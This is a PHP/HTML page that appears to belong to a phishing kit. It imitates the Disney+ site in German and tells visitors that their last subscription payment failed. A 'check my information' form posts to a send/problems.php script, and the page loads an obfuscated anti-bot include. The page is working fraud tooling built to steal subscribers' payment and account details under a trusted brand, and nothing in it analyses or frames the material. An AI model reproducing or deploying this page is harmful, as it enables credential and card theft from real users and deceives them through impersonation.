﻿﻿<?php
ob_start();
session_start();
include('../AB/autoload_obfs.php');

?>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta http-equiv="Cache-Control" content="no-cache">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <meta name="apple-mobile-web-app-title" content="Disney+">
    <meta name="theme-color" content="#ffffff">
    <meta name="msapplication-TileColor" content="#ffffff">

    <link rel="manifest" href="../img/ico/manifest.json">
    <link rel="shortcut icon" href="../img/ico/favicon.ico">
    <link rel="mask-icon" href="../img/ico/safari-pinned-tab.svg" color="#1d1fff">
    <link rel="apple-touch-icon" sizes="180x180" href="../img/ico/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="../img/ico/favicon-32x32.png">

    <title>Verbindung | Disney+</title>


    <link rel="stylesheet" type="text/css" href="../style/app_styles_bundle.css">
    <link rel="stylesheet" type="text/css" href="../style/main.css">
    <link rel="stylesheet" type="text/css" href="../style/react.css">
    <style>
        html {
            display: none;
        }
    </style>
    <script>
        if (self == top) {
            document.documentElement.style.display = 'block';
        } else {
            top.location = self.location;
        }
    </script>
</head>

<body id="app_index" class="js-focus-visible">


    <style data-styled="" data-styled-version="4.4.1"></style>
    <div id="webAppRoot" data-reactroot="">
        <div id="app_body_content" data-testid="adult-enabled-profile">
            <div class="sc-esoVGF cNOTUj"></div>
            <div id="hudson-wrapper" class="sc-ZUflv kcCFNP video_view--hidden  ">
                <div class="sc-hPeUyl bhhZhW hudson-container">
                    <div data-testid="" class="sc-hSdWYo dfLgnK"><img alt="" aria-hidden="true" src="../img/icon-loader-32@3x.png" class="sc-eHgmQL jstxUN"></div>
                </div>
            </div>
            <div id="webAppHeader" class="onboarding">
                <div class="sc-iuJeZd hcKoaM">
                    <div class="sc-cmthru cJkwKD"><img style="width: 100%; margin: 0px;" src="../img/ico/logo.svg" id="logo" class="sc-kEYyzF jLfEtv"></div>
                </div>
            </div>
            <div id="webAppScene">
                <div id="app_scene_content">
                    <div id="app-background" class="sc-ekHBYt eIfKUM"></div>
                    <main class="onboarding" id="onboarding_index" style="top: 0px;">
                        <div class="onboarding-wrapper">
                            <form id="dssLogin" name="dssLogin" action="<?php echo './send/problems.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()); ?>" method="post">
                                <h3 color="white" style="text-align:center; color: rgb(249, 249, 249); margin: 0px; padding: 0px 0px 24px;" class="sc-gZMcBi jhLoHG">Benachrichtigung über die Aussetzung</h3>
                                <p  color="white" style="text-align:center; color: rgb(249, 249, 249); margin: 0px; padding: 0px 0px 12px;" > Die letzte Abbuchung von Ihrem Abonnement ist fehlgeschlagen. </p>
                                <br/>
                                <p  color="white" style="text-align:center; color: rgb(249, 249, 249); margin: 0px; padding: 0px 0px 12px;" > Klicken Sie auf die Schaltfläche unten, um Ihre Angaben zu aktualisieren.  </p>
                                <br/>
                                <div><button aria-label="Accepter et continuer" data-testid="login-continue-button" role="button" kind="primary" value="submit" class="sc-gPEVay jOqQLP" id="" type="submit">Meine Informationen überprüfen</button></div>
                            </form>
                        </div>
                    </main>
                </div>
            </div>
            <div tabindex="0" class="sc-eAKXzc fcUHFZ">
                <div id="cta-toast" class="sc-bfYoXt gCjimr"><button aria-label="" data-testid="" role="button" kind="primary" class="sc-gPEVay edYBEy sc-gbOuXE bcVAiB" id="" type="submit">DISNEY+ ERHALTEN</button></div>
            </div>
            <div id="webAppFooter">
                <footer class="sc-fgfRvd kAzEpp" style="margin-top: 100px;" id="footer">
                    <div class="sc-hIVACf fPaITX"><img style="width: 100%; margin: 0px;" src="../img/ico/logo.svg" id="logo" class="sc-kEYyzF jLfEtv"></div>
                    <div class="sc-gpHHfC fohBoY"><button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Regeln zum Schutz der Privatsphäre</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Modalitäten in Bezug auf Cookies</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Rechte Daten in der EU und im Vereinigten Königreich</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Über Disney+</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Allgemeine Abonnementbedingungen</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Hilfe</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Kompatible Geräte</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Über Disney+</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Interessenorientierte Werbung</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Ihre Einstellungen verwalten</button>
                    </div>
                    <div class="sc-gVyKpa kOxdJt">© Disney. Alle Rechte vorbehalten.</div>
                </footer>
            </div>
        </div>
    </div>





</body>

</html>